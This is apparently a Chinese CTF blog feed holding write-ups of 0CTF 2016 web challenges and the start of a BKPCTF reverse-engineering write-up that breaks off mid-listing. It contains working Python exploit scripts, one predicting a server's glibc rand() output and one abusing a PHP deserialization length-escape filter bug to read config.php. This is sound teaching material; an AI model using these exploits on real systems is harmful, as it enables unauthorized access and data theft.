<p>linux服务器随机数的范围是0-2147483647, 所以 <code>r[i] = (r[i-3] + r[i-31]) % 2147483648</code><br>payload:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">POC</span>:</span></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">		self.url = <span class="string">"http://202.120.7.202:8888"</span></span><br><span class="line">		self.url2 = <span class="string">"http://202.120.7.202:8888/?go="</span></span><br><span class="line">		self.url3 = <span class="string">"http://202.120.7.202:8888/?"</span></span><br><span class="line">		self.s = requests.session()</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">test</span><span class="params">(self)</span>:</span></span><br><span class="line">		ran_num = []</span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">49</span>):</span><br><span class="line">			req = self.s.get(self.url)</span><br><span class="line">			cont = req.content</span><br><span class="line">			<span class="keyword">try</span>:</span><br><span class="line">				num = re.findall(<span class="string">r'(.+)&lt;code&gt;'</span>,cont)[<span class="number">0</span>]</span><br><span class="line">			<span class="keyword">except</span>:</span><br><span class="line">				<span class="keyword">print</span> i</span><br><span class="line">				exit(-<span class="number">1</span>)</span><br><span class="line">			ran_num(int(num))</span><br><span class="line"></span><br><span class="line">		req = self.s.get(self.url2)</span><br><span class="line">		cont = req.content</span><br><span class="line">		ran_num.append(int(cont[<span class="number">1</span>:-<span class="number">32</span>]))</span><br><span class="line">		md5_num = cont[-<span class="number">32</span>:]</span><br><span class="line">		</span><br><span class="line">		go_num = []</span><br><span class="line">		<span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">			y = <span class="number">50</span> + x</span><br><span class="line">			tem_num1 = (ran_num[y-<span class="number">3</span>] + ran_num[y-<span class="number">31</span>]) % <span class="number">2147483648</span></span><br><span class="line">			ran_num.append(tem_num1)</span><br><span class="line">			go_num.append(str(tem_num1))</span><br><span class="line"></span><br><span class="line">		now_num = <span class="string">""</span>.join(go_num)</span><br><span class="line">		now_md5 = hashlib.md5(now_num).hexdigest()</span><br><span class="line">		<span class="keyword">if</span> md5_num == now_md5:</span><br><span class="line">			<span class="keyword">print</span> <span class="string">"yes"</span></span><br><span class="line">			self.num5 = self.go_num</span><br><span class="line">			self.suc()</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">suc</span><span class="params">(self)</span>:</span></span><br><span class="line">		<span class="keyword">for</span> x <span class="keyword">in</span> self.num5:</span><br><span class="line">			self.url3 += <span class="string">"check[]="</span>+str(x) + <span class="string">"&amp;"</span></span><br><span class="line">		req = self.s.get(self.url3)</span><br><span class="line">		<span class="keyword">print</span> req.content</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">	t = POC()</span><br><span class="line">	t.test()</span><br></pre></td></tr></table></figure></p>
<p>然后我没做出来的问题在于。。。。我不会python..<br>error code:<br><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="atom">ran_num</span>.<span class="atom">append</span>(<span class="atom">int</span>(<span class="atom">cont</span>[<span class="number">1</span>:-<span class="number">33</span>]))</span><br><span class="line"><span class="atom">md5_num</span> = <span class="atom">cont</span>[-<span class="number">33</span>:-<span class="number">1</span>]</span><br></pre></td></tr></table></figure></p>
<p>然后这题发现没法复现，本地或是自己的服务器中，每次访问rand的seed都会变，就算keep-alive也是。。不知道题目服务器做了啥设置。。。</p>
<h1 id="piapiapia">piapiapia</h1><p>这题是代码审计，让我知道了原来我不会php<br>大致看了一遍可以看出一处问题：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// update.php</span></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/[^a-zA-Z0-9_]/'</span>, <span class="variable">$_POST</span>[<span class="string">'nickname'</span>]) || strlen(<span class="variable">$_POST</span>[<span class="string">'nickname'</span>]) &gt; <span class="number">10</span>)</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">'Invalid nickname'</span>);</span><br></pre></td></tr></table></figure></p>
<p>如果POST或者GET传参除了字符串还可以传递数组，所以如果nickname为数组的话，则可绕过该判断。update.php中之后是将输入序列化，在profile.php中反序列化。所以猜测是序列化这有洞，可是google搜了一通之后。得到的都是Joomla的反序列化截断漏洞。并没有得到啥有用的信息。。</p>
<p>然后又有一发现<br><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$safe</span> <span class="subst">=</span> <span class="built_in">array</span>(<span class="string">'select'</span>, <span class="string">'insert'</span>, <span class="string">'update'</span>, <span class="string">'delete'</span>, <span class="string">'where'</span>);</span><br><span class="line"><span class="variable">$safe</span> <span class="subst">=</span> <span class="string">'/'</span> <span class="built_in">. </span>implode(<span class="string">'|'</span>, <span class="variable">$safe</span>) <span class="built_in">. </span><span class="string">'/i'</span>;</span><br><span class="line"><span class="keyword">return</span> preg_replace(<span class="variable">$safe</span>, <span class="string">'hacker'</span>, <span class="variable">$string</span>);</span><br></pre></td></tr></table></figure></p>
<p>如果输入中有where则会变成hacker，多了一个字符，反序列化的时候会出错。。当时并没有想出利用方法。。之后看了wp之后才知道。</p>
<p>payload:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">POC</span>:</span></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">		self.data = &#123;<span class="string">"username"</span>: <span class="string">"ddog1"</span>, <span class="string">"password"</span>: <span class="string">"ddog1"</span>&#125;</span><br><span class="line">		self.reg()</span><br><span class="line">		self.login()</span><br><span class="line">		self.fuck()</span><br><span class="line">		self.get_flag()	</span><br><span class="line">			</span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">reg</span><span class="params">(self)</span>:</span></span><br><span class="line">		url = <span class="string">"http://xxx/register.php"</span></span><br><span class="line">		req = requests.post(url, data=self.data)</span><br><span class="line">		<span class="keyword">if</span> req.status_code != <span class="number">200</span>:</span><br><span class="line">			<span class="keyword">print</span> req.content</span><br><span class="line">			exit(-<span class="number">1</span>)</span><br><span class="line">			</span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(self)</span>:</span></span><br><span class="line">		url = <span class="string">"http://xxx:8085/index.php"</span></span><br><span class="line">		req = requests.post(url, data=self.data)</span><br><span class="line">		<span class="keyword">if</span> <span class="keyword">not</span> re.search(<span class="string">"UPDATE|Profile"</span>,req.content):</span><br><span class="line">			<span class="keyword">print</span> req.content</span><br><span class="line">			<span class="keyword">print</span> <span class="string">"login fail！"</span></span><br><span class="line">			exit(-<span class="number">1</span>)</span><br><span class="line">		cookie = req.request.headers[<span class="string">'Cookie'</span>]</span><br><span class="line">		cookie = cookie.split(<span class="string">"="</span>)</span><br><span class="line">		self.cookie = &#123;cookie[<span class="number">0</span>]: cookie[<span class="number">1</span>]&#125;</span><br><span class="line">		</span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">fuck</span><span class="params">(self)</span>:</span></span><br><span class="line">		url = <span class="string">"http://xxx:8085/update.php"</span></span><br><span class="line">		payload = <span class="string">'";&#125;s:5:"photo";s:10:"config.php";&#125;;'</span></span><br><span class="line">		payload = <span class="string">"where"</span> * len(payload) + payload</span><br><span class="line">		f = open(<span class="string">'/tmp/a.jpg'</span>,<span class="string">"w"</span>)</span><br><span class="line">		f.write(<span class="string">"fffff"</span>*<span class="number">1024</span>)</span><br><span class="line">		f.close()</span><br><span class="line">		files = &#123;<span class="string">"photo"</span>: (<span class="string">"fff.jpg"</span>, open(<span class="string">"/tmp/a.jpg"</span>,<span class="string">"rb"</span>))&#125;</span><br><span class="line">		data = &#123;<span class="string">"phone"</span>: <span class="string">"1"</span>*<span class="number">11</span>, <span class="string">"email"</span>: <span class="string">"fffff@qq.com"</span>, <span class="string">"nickname[]"</span>: payload&#125;</span><br><span class="line">		req = requests.post(url, data=data, cookies=self.cookie, files=files)</span><br><span class="line">		<span class="keyword">if</span> <span class="keyword">not</span> re.search(<span class="string">"Success"</span>, req.content):</span><br><span class="line">			<span class="keyword">print</span> req.content</span><br><span class="line">			exit(-<span class="number">1</span>)</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">get_flag</span><span class="params">(self)</span>:</span></span><br><span class="line">		url = <span class="string">"http://xxx:8085/profile.php"</span></span><br><span class="line">		req = requests.get(url, cookies=self.cookie)</span><br><span class="line">		<span class="keyword">try</span>:</span><br><span class="line">			base = re.findall(<span class="string">'base64,(.+?)"'</span>,req.content)[<span class="number">0</span>]</span><br><span class="line">		<span class="keyword">except</span>:</span><br><span class="line">			<span class="keyword">print</span> req.content</span><br><span class="line">			<span class="keyword">print</span> <span class="string">"crack fail!"</span></span><br><span class="line">			exit(-<span class="number">1</span>)</span><br><span class="line">		<span class="keyword">print</span> <span class="string">"crack success!"</span></span><br><span class="line">		<span class="keyword">print</span> <span class="string">"=========================="</span></span><br><span class="line">		<span class="keyword">print</span> base64.b64decode(base)</span><br><span class="line">		<span class="keyword">print</span> <span class="string">"=========================="</span></span><br><span class="line">		</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">	POC()</span><br></pre></td></tr></table></figure></p>
<p>这题没做出来就是对序列化的理解不清楚。比如一个序列化字符串<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="rule"><span class="attribute">a</span>:<span class="value"><span class="number">1</span>:&#123;i:<span class="number">0</span></span></span>;<span class="rule"><span class="attribute">s</span>:<span class="value"><span class="number">5</span>:<span class="string">"aaaaa"</span></span></span>;&#125;</span><br></pre></td></tr></table></figure></p>
<p><strong>第一点</strong>，反序列化时，当反序列化完一个序列后，就会停止，比如<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="rule"><span class="attribute">a</span>:<span class="value"><span class="number">1</span>:&#123;i:<span class="number">0</span></span></span>;<span class="rule"><span class="attribute">s</span>:<span class="value"><span class="number">5</span>:<span class="string">"aaaaa"</span></span></span>;&#125;<span class="tag">dfklasfjkal</span></span><br></pre></td></tr></table></figure></p>
<p>上面的字符串进行反序列化和第一个字符串反序列化是一样的。。。</p>
<p><strong>第二点</strong>，序列化字符串里没有转义字符。。所以说有了可以闭合序列化的可能，关键在于长度，序列一共由三部分组成，<code>数据类型:长度:数据</code>，看下面的例子<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="preprocessor">&lt;?php</span></span><br><span class="line">var_dump(unserialize(<span class="string">'a:1:&#123;i:0;s:5:"aa";&#125;";&#125;'</span>));</span><br><span class="line"><span class="comment">// out</span></span><br><span class="line"><span class="comment">// array(1) &#123;</span></span><br><span class="line"><span class="comment">//  [0]=&gt;</span></span><br><span class="line"><span class="comment">//  string(5) "aa\";&#125;"</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"><span class="preprocessor">?&gt;</span></span></span><br><span class="line">then</span><br><span class="line"><span class="php"><span class="preprocessor">&lt;?php</span></span><br><span class="line">var_dump(unserialize(<span class="string">'a:1:&#123;i:0;s:2:"aa";&#125;";&#125;'</span>));</span><br><span class="line"><span class="comment">// out</span></span><br><span class="line"><span class="comment">// array(1) &#123;</span></span><br><span class="line"><span class="comment">//  [0]=&gt;</span></span><br><span class="line"><span class="comment">//  string(2) "aa"</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"><span class="preprocessor">?&gt;</span></span></span><br></pre></td></tr></table></figure></p>
<p>这就是这题的重点了，但是怎么控制长度呢？就是通过 <code>where -&gt; hacker</code>  然后字符串逃逸。<br>所以得出payload:<br><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = '<span class="string">";&#125;s:5:"</span>photo<span class="string">";s:10:"</span>config.php<span class="string">";&#125;;'</span></span><br><span class="line">payload = <span class="string">"where"</span> * len(payload) + payload</span><br></pre></td></tr></table></figure></p>
<p>然后是复现这题，在复现的过程中随便学习了下运维。。</p>
<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"># 新建组</span><br><span class="line">$ groupadd ctf5</span><br><span class="line"># 新建一个专门用于php-fpm的用户</span><br><span class="line">$ useradd ctf5 -<span class="keyword">M</span> -s /sbin/nologin -<span class="keyword">g</span> ctf5</span><br><span class="line"># 创建pid, sock文件</span><br><span class="line">$ touch /usr/<span class="keyword">local</span>/php/<span class="keyword">var</span>/<span class="keyword">run</span>/php-fpm-ctf5.pid</span><br><span class="line">$ touch /tmp/php-cgi-ctf5.sock</span><br><span class="line"># sock是被nginx使用所以需要把所属用户和用户组改成和nginx一样</span><br><span class="line">$ chown www:www /tmp/php-cgi-ctf5.sock</span><br><span class="line"># 修改nginx虚拟主机文件</span><br><span class="line">$ vim /usr/<span class="keyword">local</span>/nginx/<span class="keyword">conf</span>/vhost/ctf5.<span class="keyword">conf</span></span><br><span class="line">    fastcgi_pass  unix:/tmp/php-cgi-ctf5.sock;    #修改成这样</span><br><span class="line"># 创建php-fpm配置文件</span><br><span class="line">$ cp /usr/<span class="keyword">local</span>/php/etc/php-fpm.<span class="keyword">conf</span> /usr/<span class="keyword">local</span>/php/etc/php-fpm-ctf5.<span class="keyword">conf</span></span><br><span class="line">$ vim /usr/<span class="keyword">local</span>/php/etc/php-fpm-ctf5.<span class="keyword">conf</span></span><br><span class="line">[<span class="keyword">global</span>]</span><br><span class="line">pid = /usr/<span class="keyword">local</span>/php/<span class="keyword">var</span>/<span class="keyword">run</span>/php-fpm-ctf5.pid</span><br><span class="line">error_log = /usr/<span class="keyword">local</span>/php/<span class="keyword">var</span>/<span class="keyword">log</span>/php-fpm-ctf5.<span class="literal">log</span></span><br><span class="line">log_level = notice</span><br><span class="line"></span><br><span class="line">[ctf5]</span><br><span class="line">listen = /tmp/php-cgi-ctf5.sock</span><br><span class="line">listen.backlog = -1</span><br><span class="line">listen.allowed_clients = 127.0.0.1</span><br><span class="line">listen.owner = ctf5</span><br><span class="line">listen.group = ctf5</span><br><span class="line">listen.mode = 0666</span><br><span class="line">user = ctf5</span><br><span class="line">group = ctf5</span><br><span class="line">pm = dynamic</span><br><span class="line">pm.max_children = 10</span><br><span class="line">pm.start_servers = 1</span><br><span class="line">pm.min_spare_servers = 1</span><br><span class="line">pm.max_spare_servers = 6</span><br><span class="line">request_terminate_timeout = 100</span><br><span class="line">request_slowlog_timeout = 0</span><br><span class="line">slowlog = <span class="keyword">var</span>/<span class="keyword">log</span>/slow-ctf5.<span class="literal">log</span></span><br><span class="line"></span><br><span class="line"># 修改/etc/init.<span class="keyword">d</span>/php-fpm</span><br><span class="line">vhost=<span class="label">$2</span></span><br><span class="line"><span class="keyword">if</span> [ -<span class="keyword">n</span> <span class="string">"$vhost"</span> ];then</span><br><span class="line">        vhost=-<span class="label">$vhost</span></span><br><span class="line">fi</span><br><span class="line">php_fpm_CONF=<span class="label">$&#123;prefix&#125;</span>/etc/php-fpm<span class="label">$vhost</span>.<span class="keyword">conf</span></span><br><span class="line">php_fpm_PID=<span class="label">$&#123;prefix&#125;</span>/<span class="keyword">var</span>/<span class="keyword">run</span>/php-fpm<span class="label">$vhost</span>.pid</span><br><span class="line"></span><br><span class="line">restart)</span><br><span class="line">                <span class="label">$0</span> stop <span class="label">$2</span></span><br><span class="line">                <span class="label">$0</span> start <span class="label">$2</span></span><br><span class="line"></span><br><span class="line"># 修改文件夹权限</span><br><span class="line">$ chown ctf5:www -R /home/wwwroot/ctf5</span><br><span class="line"># 最后记得重启</span><br><span class="line">$ sudo /etc/init.<span class="keyword">d</span>/nginx restart</span><br><span class="line">$ sudo /etc/init.<span class="keyword">d</span>/php-fpm start ctf5</span><br></pre></td></tr></table></figure>]]></content>
    <summary type="html">
    <![CDATA[<blockquote>
<p>这次的0CTF我们投机取巧派被学院派教做人。。然后发现自己，不会js，不会php。不会python。web题看了两题，都差一点出来。。</p>
</blockquote>]]>
    
    </summary>
    
      <category term="CTF" scheme="http://0x48.pw/tags/CTF/"/>
    
      <category term="H-blog" scheme="http://0x48.pw/categories/H-blog/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[unholy Writeup]]></title>
    <link href="http://0x48.pw/2016/03/07/0x11/"/>
    <id>http://0x48.pw/2016/03/07/0x11/</id>
    <published>2016-03-07T02:16:46.000Z</published>
    <updated>2016-03-28T10:19:25.414Z</updated>
    <content type="html"><![CDATA[<blockquote>
<p>这周末和小伙伴们一起打BKPCTF，我一个web狗，竟然撸逆向停不下来。。。撸了两个晚上。。。终于撸出来了。。</p>
</blockquote>
<a id="more"></a>
<p>unholy这题说是ruby+python，其实我觉得主要还是逆C。。<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">main.rb</span><br><span class="line">require_relative 'unholy'</span><br><span class="line">include UnHoly</span><br><span class="line">python_hi</span><br><span class="line">puts ruby_hi</span><br><span class="line">puts "Programming Skills: PRIMARILY RUBY AND PYTHON BUT I CAN <span class="operator"><span class="keyword">USE</span> <span class="keyword">ANY</span> TYPE <span class="keyword">OF</span> GEM <span class="keyword">TO</span> CONTROL <span class="keyword">ANY</span> TYPE <span class="keyword">OF</span> SNAKE<span class="string">"</span><br><span class="line">puts "</span>give me your flag<span class="string">"</span><br><span class="line">flag = gets.chomp!</span><br><span class="line">arr = flag.unpack("</span>V*<span class="string">")</span><br><span class="line">is_key_correct? arr</span></span></span><br></pre></td></tr></table></figure></p>
<p>一个很简单的ruby脚本，不过这里需要装libruby2.1才能跑。。。（自己装装就知道了，国内装libruby2.1有点坑)<br>然后重点在于unholy.so，丢到ida中逆向看看，有几个重要的地方，主要是<code>method_check_key</code>函数，也就是ruby里的is_key_correct?<br>这个函数规定了只能传入长度为９的int型数组<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">mov</span>     [<span class="literal">rsp</span>+<span class="number">13E8h</span>+matrix+<span class="number">24h</span>], <span class="number">61735320h</span>　；　matrix[<span class="number">9</span>] = <span class="number">0x61735320</span></span><br></pre></td></tr></table></figure></p>
<p>形成长度为10的数组，然后经过如下算法<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="label">loc_BFC:</span>                                <span class="comment">; CODE XREF: method_check_key+112j</span></span><br><span class="line"><span class="string">.text</span>:0000000000000BFC block = <span class="literal">rdx</span>                             <span class="comment">; uint32_t[2]</span></span><br><span class="line"><span class="string">.text</span>:0000000000000BFC                 <span class="keyword">mov</span>     <span class="literal">rax</span>, [<span class="literal">rbx</span>+<span class="literal">rdi</span>]</span><br><span class="line"><span class="string">.text</span>:0000000000000C00 block = <span class="literal">rax</span>                             <span class="comment">; uint32_t[2]</span></span><br><span class="line"><span class="string">.text</span>:0000000000000C00                 <span class="keyword">xor</span>     <span class="literal">r8d</span>, <span class="literal">r8d</span></span><br><span class="line"><span class="string">.text</span>:0000000000000C03                 <span class="keyword">mov</span>     <span class="number">edx</span>, <span class="number">eax</span></span><br><span class="line"><span class="string">.text</span>:0000000000000C05                 <span class="keyword">shr</span>     block, <span class="number">20h</span></span><br><span class="line"><span class="string">.text</span>:0000000000000C09</span><br><span class="line"><span class="label">loc_C09:</span>                                <span class="comment">; CODE XREF: method_check_key+FDj</span></span><br><span class="line"><span class="string">.text</span>:0000000000000C09                 <span class="keyword">mov</span>     <span class="number">ecx</span>, <span class="literal">r8d</span></span><br><span class="line"><span class="string">.text</span>:0000000000000C0C                 <span class="keyword">mov</span>     <span class="literal">esi</span>, <span class="number">eax</span></span><br><span class="line"><span class="string">.text</span>:0000000000000C0E                 <span class="keyword">and</span>     <span class="number">ecx</span>, <span class="number">3</span></span><br><span class="line"><span class="string">.text</span>:0000000000000C11                 <span class="keyword">shr</span>     <span class="literal">esi</span>, <span class="number">5</span></span><br><span class="line"><span class="string">.text</span>:0000000000000C14                 <span class="keyword">mov</span>     <span class="literal">r9d</span>, [<span class="literal">rsp</span>+<span class="literal">rcx</span>*<span class="number">4</span>+<span class="number">13E8h</span>+key]</span><br><span class="line"><span class="string">.text</span>:0000000000000C19                 <span class="keyword">mov</span>     <span class="number">ecx</span>, <span class="number">eax</span></span><br><span class="line"><span class="string">.text</span>:0000000000000C1B                 <span class="keyword">shl</span>     <span class="number">ecx</span>, <span class="number">4</span></span><br><span class="line"><span class="string">.text</span>:0000000000000C1E                 <span class="keyword">xor</span>     <span class="literal">esi</span>, <span class="number">ecx</span></span><br><span class="line"><span class="string">.text</span>:0000000000000C20                 <span class="keyword">lea</span>     <span class="number">ecx</span>, [<span class="literal">rsi</span>+<span class="literal">rax</span>]</span><br><span class="line"><span class="string">.text</span>:0000000000000C23                 <span class="keyword">add</span>     <span class="literal">r9d</span>, <span class="literal">r8d</span></span><br><span class="line"><span class="string">.text</span>:0000000000000C26                 <span class="keyword">sub</span>     <span class="literal">r8d</span>, <span class="number">61C88647h</span></span><br><span class="line"><span class="string">.text</span>:0000000000000C2D                 <span class="keyword">xor</span>     <span class="number">ecx</span>, <span class="literal">r9d</span></span><br><span class="line"><span class="string">.text</span>:0000000000000C30                 <span class="keyword">add</span>     <span class="number">edx</span>, <span class="number">ecx</span></span><br><span class="line"><span class="string">.text</span>:0000000000000C32                 <span class="keyword">mov</span>     <span class="number">ecx</span>, <span class="literal">r8d</span></span><br><span class="line"><span class="string">.text</span>:0000000000000C35                 <span class="keyword">shr</span>     <span class="number">ecx</span>, <span class="number">0Bh</span></span><br><span class="line"><span class="string">.text</span>:0000000000000C38                 <span class="keyword">mov</span>     <span class="literal">esi</span>, <span class="number">edx</span></span><br><span class="line"><span class="string">.text</span>:0000000000000C3A                 <span class="keyword">and</span>     <span class="number">ecx</span>, <span class="number">3</span></span><br><span class="line"><span class="string">.text</span>:0000000000000C3D                 <span class="keyword">shr</span>     <span class="literal">esi</span>, <span class="number">5</span></span><br><span class="line"><span class="string">.text</span>:0000000000000C40                 <span class="keyword">mov</span>     <span class="literal">r9d</span>, [<span class="literal">rsp</span>+<span class="literal">rcx</span>*<span class="number">4</span>+<span class="number">13E8h</span>+key]</span><br><span class="line"><span class="string">.text</span>:0000000000000C45                 <span class="keyword">mov</span>     <span class="number">ecx</span>, <span class="number">edx</span></span><br><span class="line"><span class="string">.text</span>:0000000000000C47                 <span class="keyword">shl</span>     <span class="number">ecx</span>, <span class="number">4</span></span><br><span class="line"><span class="string">.text</span>:0000000000000C4A                 <span class="keyword">xor</span>     <span class="literal">esi</span>, <span class="number">ecx</span></span><br><span class="line"><span class="string">.text</span>:0000000000000C4C                 <span class="keyword">lea</span>     <span class="number">ecx</span>, [<span class="literal">rsi</span>+<span class="literal">rdx</span>]</span><br><span class="line"><span class="string">.text</span>:0000000000000C4F                 <span class="keyword">add</span>     <span class="literal">r9d</span>, <span class="literal">r8d</span></span><br><span class="line"><span class="string">.text</span>:0000000000000C52                 <span class="keyword">xor</span>     <span class="number">ecx</span>, <span class="literal">r9d</span></span><br><span class="line"><span 